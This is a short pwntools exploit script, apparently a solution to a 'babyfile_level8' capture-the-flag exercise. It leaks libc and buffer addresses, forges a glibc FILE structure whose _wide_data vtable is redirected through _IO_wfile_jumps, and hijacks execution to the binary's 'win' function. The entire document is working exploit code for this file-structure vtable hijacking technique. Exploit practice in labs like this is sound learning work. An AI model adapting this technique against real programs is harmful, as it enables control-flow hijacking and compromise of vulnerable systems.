#Nagib Lakhdari 3si2
from pwn import *

# Set the architecture context to amd64
context.arch = 'amd64'

# Start the process for the challenge binary
p = process("/challenge/babyfile_level8")
# Uncomment the following line for debugging with gdb
# p = gdb.debug("/challenge/babyfile_level8", gdbscript="b *_start")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
binary = ELF("/challenge/babyfile_level8")

# Offsets for vtable manipulation
_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

# libc leak
p.recvuntil(b"[LEAK]")
p.recvuntil(b": ")
puts_libc_leak = int(p.recvuntil(b'\n')[:-1], 16)
print(hex(puts_libc_leak))
libc_base = puts_libc_leak - libc.sym.puts
libc.address = libc_base

# file struct location leak
p.recvuntil(b"[LEAK]")
p.recvuntil(b"[LEAK]")
p.recvuntil(b": ")
buf = int(p.recvuntil(b'\n')[:-1], 16)
print(hex(buf))

# Create a fake FileStructure
fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps'] + 24 - 0x38  # fwrite calling vtable + 0x38
fs._lock = buf - 0x10  # writable null
fs._wide_data = buf  # wide_data vtable will be right below the FILE_plus struct

# fake wide_data vtable
# point to the memory right below itself
_wide_data_vtable_loc = buf + _wide_vtable_offset + 0x8
_wide_vtable = b"a" * doallocbuf_call_offset + p64(binary.sym['win'])

# overwrite the file struct
payload = bytes(fs) + p64(_wide_data_vtable_loc) + _wide_vtable
p.send(payload)

# Interact with the process to get the output
p.interactive()
